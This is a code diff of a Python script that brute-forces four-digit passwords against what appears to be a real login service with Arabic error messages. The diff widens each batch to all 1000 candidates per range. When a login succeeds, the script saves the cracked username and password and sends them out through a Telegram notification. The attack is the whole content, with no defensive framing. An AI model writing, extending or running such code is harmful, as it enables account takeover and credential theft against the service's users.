@@ -130,21 +130,22 @@ def send_request(payload):
 # --- Password Brute-forcing Logic (Modified) ---
 def try_passwords_batch(username, start_idx):
     """
-    Tries the first 10 passwords within the range starting at start_idx.
+    Tries all 1000 passwords within the range starting at start_idx.
     Passwords are 4 digits, 0000-9999.
     start_idx will be 0, 1000, 2000, ..., 9000.
-    This function will test start_idx, start_idx+1, ..., start_idx+9.
+    This function will test start_idx, start_idx+1, ..., start_idx+999.
     """
     global current_step, processed_requests, total_requests, success_info
 
-    # Passwords to try in this batch (only the first 10 in the 1000-range)
+    # Passwords to try in this batch (all 1000 in the 1000-range)
     password_attempts = [str(i).zfill(4)
-                         for i in range(start_idx, min(start_idx + 1000, 10000))]
+                         for i in range(start_idx, min(start_idx + 1000, 10000))] # <-- CHANGED '10' to '1000'
 
-    total_requests = len(password_attempts)
+    total_requests = len(password_attempts) # This will now be 1000 (or less for the last batch)
     processed_requests = 0
 
-    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 9, 9999):04d} for: {username}"
+    # Update step description to reflect the larger batch size
+    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 999, 9999):04d} for: {username}" # <-- Updated description
     print(current_step)
 
     for password in password_attempts:
@@ -153,36 +154,24 @@ def try_passwords_batch(username, start_idx):
         processed_requests += 1
 
         # Check for success message (or absence of known error message)
-        # Assuming success is indicated by a message *not* being "خطأ في إسم المستخدم أو كلمة المرور" or a request error
         if result and result.get("message") not in ["خطأ في إسم المستخدم أو كلمة المرور", "Request failed", "Unexpected error"]:
              # Success found!
              success_entry = {
                  "username": username,
                  "password": password,
-                 "status": result.get("status", "Success"), # Use result status if available
+                 "status": result.get("status", "Success"),
                  "duration": result.get("duration", "N/A"),
                  "remaining": result.get("remaining", "N/A"),
-                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S") # Add timestamp
+                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
              }
 
-             # --- Send Telegram Notification ---
              send_telegram_success_notification(success_entry)
-             # ------------------------------------
-
-             save_success(success_entry) # Save to file and update in-memory list
+             save_success(success_entry)
              current_step = f"🎉 SUCCESS found for {username} with password {password}!"
              print(current_step)
              return True # Indicate success, move to next username
 
-        # Optional: Log other known error messages
-        # elif result and result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
-        #      # This is the expected error for an invalid username/password combo
-        #      pass
-        # elif result and result.get("message") in ["Request failed", "Unexpected error"]:
-        #     print(f"API request failed for {username}/{password}: {result.get('error', 'Unknown error')}")
-
-
-    # If loop finishes without finding success in this batch
+    # If loop finishes without finding success in this 1000-password batch
     return False
 
 
